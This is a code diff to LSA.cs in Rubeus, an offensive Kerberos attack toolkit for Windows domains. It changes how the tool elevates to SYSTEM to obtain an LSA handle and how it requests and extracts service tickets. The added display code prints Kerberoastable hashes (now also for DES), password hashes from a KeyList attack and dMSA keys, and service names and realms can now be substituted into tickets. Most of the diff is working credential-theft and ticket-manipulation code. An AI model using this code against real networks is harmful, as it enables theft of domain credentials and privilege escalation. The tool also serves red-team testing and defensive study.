@@ -10,13 +10,11 @@ using Microsoft.Win32;
 using ConsoleTables;
 using System.Security.Principal;
 using Rubeus.lib.Interop;
-using System.IO;
 using Rubeus.Kerberos;
 using Rubeus.Kerberos.PAC;
 using System.Linq;
 
-namespace Rubeus
-{
+namespace Rubeus {
     public class LSA
     {
         #region LSA interaction
@@ -27,6 +25,17 @@ namespace Rubeus
             Triage = 1,         // triage table output
             Klist = 2,          // traditional klist format
             Full = 3            // full ticket data extraction (a la "dump")
+        }
+
+        [Flags]
+        public enum CacheOptions : uint {
+            KERB_RETRIEVE_TICKET_DONT_USE_CACHE = 1,    // Always request a new ticket; do not search the cache.
+            KERB_RETRIEVE_TICKET_USE_CACHE_ONLY = 2,    // Return only a previously cached ticket.
+            KERB_RETRIEVE_TICKET_USE_CREDHANDLE = 4,    // Use the CredentialsHandle member instead of LogonId to identify the logon session. This option is not available for 32-bit Windows-based applications running on 64-bit Windows.
+            KERB_RETRIEVE_TICKET_AS_KERB_CRED = 8,      // Return the ticket as a Kerberos credential.The Kerberos ticket is defined in Internet RFC 4120 as KRB_CRED.For more information, see http://www.ietf.org.
+            KERB_RETRIEVE_TICKET_WITH_SEC_CRED = 10,    // Not implemented
+            KERB_RETRIEVE_TICKET_CACHE_TICKET = 20,     // Return the ticket that is currently in the cache. If the ticket is not in the cache, it is requested and then cached. This flag should not be used with the KERB_RETRIEVE_TICKET_DONT_USE_CACHE flag.
+            KERB_RETRIEVE_TICKET_MAX_LIFETIME = 40,     //Return a fresh ticket with maximum allowed time by the policy. The ticker is cached afterwards. Use of this flag implies that KERB_RETRIEVE_TICKET_USE_CACHE_ONLY is not set and KERB_RETRIEVE_TICKET_CACHE_TICKET is set
         }
 
         public class SESSION_CRED
@@ -54,72 +63,31 @@ namespace Rubeus
             public KRB_CRED KrbCred;
         }
 
-        public static IntPtr LsaRegisterLogonProcessHelper()
+        public static IntPtr GetLsaHandle(bool elevateToSystem = true)
         {
-            // helper that establishes a connection to the LSA server and verifies that the caller is a logon application
-            //  used for Kerberos ticket enumeration for ALL users
+            // returns a handle to LSA via LsaConnectUntrusted(), elevating to SYSTEM first
+            //  if we're high integrity so we have trusted access
+            IntPtr lsaHandle = IntPtr.Zero;
 
-            var logonProcessName = "User32LogonProcesss"; // yes I know this is "weird" ;)
-            Interop.LSA_STRING_IN LSAString;
-            var lsaHandle = IntPtr.Zero;
-            UInt64 securityMode = 0;
-
-            LSAString.Length = (ushort)logonProcessName.Length;
-            LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
-            LSAString.Buffer = logonProcessName;
-
-            var ret = Interop.LsaRegisterLogonProcess(ref LSAString, out lsaHandle, out securityMode);
-
-            return lsaHandle;
-        }
-
-        public static IntPtr GetLsaHandle()
-        {
-            // returns a handle to LSA
-            //  uses LsaConnectUntrusted() if not in high integrity
-            //  uses LsaRegisterLogonProcessHelper() if in high integrity
-
-            IntPtr lsaHandle;
-
-            if (!Helpers.IsHighIntegrity())
+            if (Helpers.IsHighIntegrity() && elevateToSystem && !Helpers.IsSystem())
             {
-                int retCode = Interop.LsaConnectUntrusted(out lsaHandle);
-            }
-
-            else
-            {
-                lsaHandle = LsaRegisterLogonProcessHelper();
-
-                // if the original call fails then it is likely we don't have SeTcbPrivilege
-                // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
-                if (lsaHandle == IntPtr.Zero)
+                // elevated but not SYSTEM, so gotta GetSystem() first
+                if (!Helpers.GetSystem())
                 {
-                    var currentName = WindowsIdentity.GetCurrent().Name;
-
-                    if (Helpers.IsSystem())
-                    {
-                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
-                        lsaHandle = LsaRegisterLogonProcessHelper();
-                    }
-                    else
-                    {
-                        // elevated but not system, so gotta GetSystem() first
-                        if (!Helpers.GetSystem())
-                        {
-                            throw new Exception("Could not elevate to system");
-                        }
-                        // should now have the proper privileges to get a Handle to LSA
-                        lsaHandle = LsaRegisterLogonProcessHelper();
-                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
-                        Interop.RevertToSelf();
-                    }
+                    throw new Exception("Could not elevate to system");
                 }
+
+                Interop.LsaConnectUntrusted(out lsaHandle);
+                Interop.RevertToSelf();
+            
+            } else {
+                Interop.LsaConnectUntrusted(out lsaHandle);
             }
 
             return lsaHandle;
         }
 
-        public static KRB_CRED ExtractTicket(IntPtr lsaHandle, int authPack, LUID userLogonID, string targetName, UInt32 ticketFlags = 0)
+        public static KRB_CRED RequestServiceTicket(IntPtr lsaHandle, int authPack, LUID userLogonID, string targetName, uint ticketFlags = 0, bool cachedTicket = true)
         {
             // extracts an encoded KRB_CRED for a specified userLogonID (LUID) and targetName (SPN)
             // by calling LsaCallAuthenticationPackage() w/ the KerbRetrieveEncodedTicketMessage message type
@@ -137,15 +105,16 @@ namespace Rubeus
             // the specific logon session ID
             request.LogonId = userLogonID;
             //request.TicketFlags = ticketFlags;
-            request.TicketFlags = 0x0;
+            request.TicketFlags = ticketFlags;
             // Note: ^ if a ticket has the forwarded flag (instead of initial), hard specifying the ticket
             //      flags here results in no match, and a new (RC4_HMAC?) ticket is requested but not cached
             //      from https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_retrieve_tkt_request :
             //          "If there is no match in the cache, a new ticket with the default flag values will be requested."
             //  Yes, I know this is weird. No, I have no idea why it happens. Specifying 0x0 (the default) will return just the main
             //      (initial) TGT, or a forwarded ticket if that's all that exists (a la the printer bug)
-            request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED - return the ticket as a KRB_CRED credential
+            request.CacheOptions = (uint)(CacheOptions.KERB_RETRIEVE_TICKET_AS_KERB_CRED | (cachedTicket ? 0 : CacheOptions.KERB_RETRIEVE_TICKET_DONT_USE_CACHE)); 
             request.EncryptionType = 0x0;
+ 
             
             // the target ticket name we want the ticket for
             var tName = new Interop.UNICODE_STRING(targetName);
@@ -234,7 +203,7 @@ namespace Rubeus
             //      and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
             //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)
 
-            //  For elevated enumeration, the code first uses LsaConnectUntrusted() to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
+            //  For non-elevated enumeration, the code first uses LsaConnectUntrusted() to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
             //      to enumerate all cached tickets, then uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
             //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)
 
@@ -420,7 +389,7 @@ namespace Rubeus
                                     if (extractTicketData)
                                     {
                                         // STEP 4 - query LSA again, specifying we want the actual ticket data for this particular ticket (.kirbi/KRB_CRED)
-                                        ticket.KrbCred = ExtractTicket(lsaHandle, authPack, ticketCacheRequest.LogonId, ticket.ServerName, ticketCacheResult.TicketFlags);
+                                        ticket.KrbCred = RequestServiceTicket(lsaHandle, authPack, ticketCacheRequest.LogonId, ticket.ServerName, ticketCacheResult.TicketFlags);
                                     }
                                     sessionCred.Tickets.Add(ticket);
                                 }
@@ -434,7 +403,7 @@ namespace Rubeus
 
                     sessionCreds.Add(sessionCred);
                 }
-                // disconnect from LSA
+
                 Interop.LsaDeregisterLogonProcess(lsaHandle);
 
                 return sessionCreds;
@@ -519,7 +488,7 @@ namespace Rubeus
             }
         }
 
-        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = false, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null)
+        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = true, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null, byte[] keyList = null, string desPlainText = "", PA_DMSA_KEY_PACKAGE dmsaCurrentKeys = null)
         {
             // displays a given .kirbi (KRB_CRED) object, with display options
 
@@ -531,6 +500,7 @@ namespace Rubeus
             //  nowrap                  -   don't wrap base64 ticket output
 
             var userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
+            var principalType = cred.enc_part.ticket_info[0].pname.name_type.ToString();
             var sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
             var keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
             var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
@@ -567,7 +537,7 @@ namespace Rubeus
                 // full display with session key
                 Console.WriteLine("\r\n{0}ServiceName              :  {1}", indent, sname);
                 Console.WriteLine("{0}ServiceRealm             :  {1}", indent, cred.enc_part.ticket_info[0].srealm);
-                Console.WriteLine("{0}UserName                 :  {1}", indent, userName);
+                Console.WriteLine("{0}UserName                 :  {1}", indent, $"{userName} ({principalType})");
                 Console.WriteLine("{0}UserRealm                :  {1}", indent, cred.enc_part.ticket_info[0].prealm);
                 Console.WriteLine("{0}StartTime                :  {1}", indent, cred.enc_part.ticket_info[0].starttime.ToLocalTime());
                 Console.WriteLine("{0}EndTime                  :  {1}", indent, cred.enc_part.ticket_info[0].endtime.ToLocalTime());
@@ -575,12 +545,35 @@ namespace Rubeus
                 Console.WriteLine("{0}Flags                    :  {1}", indent, cred.enc_part.ticket_info[0].flags);
                 Console.WriteLine("{0}KeyType                  :  {1}", indent, keyType);
                 Console.WriteLine("{0}Base64(key)              :  {1}", indent, b64Key);
+                                  
+                // If KeyList attack then present the password hash
+                if (keyList != null)
+                {
+                    Console.WriteLine("{0}Password Hash            :  {2}", indent, userName, Helpers.ByteArrayToString(keyList));
+                }
+
+                if(dmsaCurrentKeys != null)
+                {
+                    string etypeName = Enum.GetName(typeof(Interop.KERB_ETYPE), dmsaCurrentKeys.currentKeys.encryptionKey.keytype);
+                    string cKeyValue = Helpers.ByteArrayToString(dmsaCurrentKeys.currentKeys.encryptionKey.keyvalue);
+
+
+                    Console.WriteLine("{0}Current Keys for {1}: ({2}) {3}", indent, userName, etypeName, cKeyValue);
+                }
+
 
                 //We display the ASREP decryption key as this is needed for decrypting
                 //PAC_CREDENTIAL_INFO inside both the AS-REP and TGS-REP Tickets when
                 //PKINIT is used
                 if (asrepKey != null)
                     Console.WriteLine("{0}ASREP (key)              :  {1}", indent, Helpers.ByteArrayToString(asrepKey));
+
+                // Display RODC number, for when a TGT is requested from an RODC
+                if (cred.tickets[0].enc_part.kvno > 65535)
+                {
+                    uint rodcNum = cred.tickets[0].enc_part.kvno >> 16;
+                    Console.WriteLine("{0}RODC Number              :  {1}", indent, rodcNum);
+                }
 
                 if (displayB64ticket)
                 {
@@ -602,15 +595,15 @@ namespace Rubeus
                 else if (extractKerberoastHash && (serviceName != "krbtgt"))
                 {
                     // if this isn't a TGT, try to display a Kerberoastable hash
-                    if (!eType.Equals(Interop.KERB_ETYPE.rc4_hmac) && !eType.Equals(Interop.KERB_ETYPE.aes256_cts_hmac_sha1))
+                    if (!eType.Equals(Interop.KERB_ETYPE.rc4_hmac) && !eType.Equals(Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                     {
                         // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
                         //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
                         Console.WriteLine("\r\n[!] Service ticket uses encryption type '{0}', unable to extract hash and salt.", eType);
                     }
-                    else if (eType.Equals(Interop.KERB_ETYPE.rc4_hmac))
+                    else if (eType.Equals(Interop.KERB_ETYPE.rc4_hmac) || eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                     {
-                        Roast.DisplayTGShash(cred);
+                        Roast.DisplayTGShash(cred, desPlainText: desPlainText);
                     }
                     else if (!String.IsNullOrEmpty(serviceUser))
                     {
@@ -635,7 +628,8 @@ namespace Rubeus
                 
                 try
                 {
-                    var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey);
+                    bool displayBlockOne = true;
+                    var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey, false, displayBlockOne);
                     PACTYPE pt = decryptedEncTicket.GetPac(asrepKey);
                     if (pt == null)
                     {
@@ -664,12 +658,17 @@ namespace Rubeus
                             Console.WriteLine("{0}  UpnDns                 :", indent);
                             Console.WriteLine("{0}    DNS Domain Name      : {1}", indent, upnDns.DnsDomainName);
                             Console.WriteLine("{0}    UPN                  : {1}", indent, upnDns.Upn);
-                            Console.WriteLine("{0}    Flags                : {1}", indent, upnDns.Flags);
+                            Console.WriteLine("{0}    Flags                : ({1}) {2}", indent, (int)upnDns.Flags, upnDns.Flags);
+                            if (upnDns.Flags.HasFlag(Interop.UpnDnsFlags.EXTENDED))
+                            {
+                                Console.WriteLine("{0}    SamName              : {1}", indent, upnDns.SamName);
+                                Console.WriteLine("{0}    Sid                  : {1}", indent, upnDns.Sid.Value);
+                            }
                         }
                         else if (pacInfoBuffer is SignatureData sigData)
                         {
                             string validation = "VALID";
-                            int i2 = 0;
+                            int i2 = 1;
                             if (sigData.Type == PacInfoBufferType.ServerChecksum && !validated.Item1)
                             {
                                 validation = "INVALID";
@@ -682,15 +681,23 @@ namespace Rubeus
                             {
                                 validation = "INVALID";
                             }
-                            else if ((sigData.Type == PacInfoBufferType.KDCChecksum || sigData.Type == PacInfoBufferType.TicketChecksum) && krbKey == null)
+                            else if (sigData.Type == PacInfoBufferType.FullPacChecksum && krbKey != null && !validated.Item4)
+                            {
+                                validation = "INVALID";
+                            }
+                            else if ((sigData.Type == PacInfoBufferType.KDCChecksum || sigData.Type == PacInfoBufferType.TicketChecksum || sigData.Type == PacInfoBufferType.FullPacChecksum) && krbKey == null)
                             {
                                 validation = "UNVALIDATED";
                             }
                             if (sigData.Type == PacInfoBufferType.KDCChecksum)
                             {
-                                i2 = 3;
+                                i2 = 4;
                             }
-                            Console.WriteLine("{0}  {1}         {2}:", indent, sigData.Type.ToString(), new string(' ', i2));
+                            else if (sigData.Type == PacInfoBufferType.FullPacChecksum)
+                            {
+                                i2 = 0;
+                            }
+                            Console.WriteLine("{0}  {1}        {2}:", indent, sigData.Type.ToString(), new string(' ', i2));
                             Console.WriteLine("{0}    Signature Type       : {1}", indent, sigData.SignatureType);
                             Console.WriteLine("{0}    Signature            : {1} ({2})", indent, Helpers.ByteArrayToString(sigData.Signature), validation);
                         }
@@ -1024,7 +1031,7 @@ namespace Rubeus
             // straight from Vincent LE TOUX' work
             //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971
 
-            var LsaHandle = IntPtr.Zero;
+            var lsaHandle = GetLsaHandle();
             int AuthenticationPackage;
             int ntstatus, ProtocalStatus;
 
@@ -1035,28 +1042,6 @@ namespace Rubeus
                     Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
                     return;
                 }
-                else
-                {
-                    if (Helpers.IsSystem())
-                    {
-                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
-                        LsaHandle = LsaRegisterLogonProcessHelper();
-                    }
-                    else
-                    {
-                        // elevated but not system, so gotta GetSystem() first
-                        Helpers.GetSystem();
-                        // should now have the proper privileges to get a Handle to LSA
-                        LsaHandle = LsaRegisterLogonProcessHelper();
-                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
-                        Interop.RevertToSelf();
-                    }
-                }
-            }
-            else
-            {
-                // otherwise use the unprivileged connection with LsaConnectUntrusted
-                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
             }
 
             var inputBuffer = IntPtr.Zero;
@@ -1069,7 +1054,7 @@ namespace Rubeus
                 LSAString.Length = (ushort)Name.Length;
                 LSAString.MaximumLength = (ushort)(Name.Length + 1);
                 LSAString.Buffer = Name;
-                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
+                ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out AuthenticationPackage);
                 if (ntstatus != 0)
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
@@ -1092,7 +1077,7 @@ namespace Rubeus
                 inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                 Marshal.StructureToPtr(request, inputBuffer, false);
                 Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
-                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
+                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                 if (ntstatus != 0)
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
@@ -1113,7 +1098,8 @@ namespace Rubeus
             {
                 if (inputBuffer != IntPtr.Zero)
                     Marshal.FreeHGlobal(inputBuffer);
-                Interop.LsaDeregisterLogonProcess(LsaHandle);
+
+                Interop.LsaDeregisterLogonProcess(lsaHandle);
             }
         }
 
@@ -1136,7 +1122,6 @@ namespace Rubeus
                     Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");
                     return;
                 }
-
             }
 
             var inputBuffer = IntPtr.Zero;
@@ -1191,6 +1176,7 @@ namespace Rubeus
             {
                 if (inputBuffer != IntPtr.Zero)
                     Marshal.FreeHGlobal(inputBuffer);
+
                 Interop.LsaDeregisterLogonProcess(lsaHandle);
             }
         }
@@ -1361,7 +1347,7 @@ namespace Rubeus
                     {
                         if (display)
                         {
-                            Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");
+                            Console.WriteLine("[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.");
                         }
 
                         // the fake delegate AP-REQ ticket is now in the cache!
@@ -1538,7 +1524,7 @@ namespace Rubeus
             return finalTGTBytes;
         }
 
-        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, LUID luid = new LUID())
+        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, LUID luid = new LUID(), string srealm = "")
         {
             // subtitutes in an alternate servicename (sname) into a supplied service ticket
 
@@ -1548,17 +1534,27 @@ namespace Rubeus
             var parts = altsname.Split('/');
             if (parts.Length == 1)
             {
+                name_string.Add(altsname);
                 // sname alone
-                kirbi.tickets[0].sname.name_string[0] = parts[0]; // ticket itself
-                kirbi.enc_part.ticket_info[0].sname.name_string[0] = parts[0]; // enc_part of the .kirbi
+                kirbi.tickets[0].sname.name_string = name_string; // ticket itself
+                kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
             }
-            else if (parts.Length == 2)
+            else if (parts.Length > 1)
             {
-                name_string.Add(parts[0]);
-                name_string.Add(parts[1]);
+                foreach (var part in parts)
+                {
+                    name_string.Add(part);
+                }
 
                 kirbi.tickets[0].sname.name_string = name_string; // ticket itself
                 kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
+            }
+
+            if (!string.IsNullOrWhiteSpace(srealm))
+            {
+                Console.WriteLine("[*] Substituting in alternate service realm: {0}", srealm);
+                kirbi.tickets[0].realm = srealm.ToUpper();
+                kirbi.enc_part.ticket_info[0].srealm = srealm.ToUpper();
             }
 
             var kirbiBytes = kirbi.Encode().Encode();
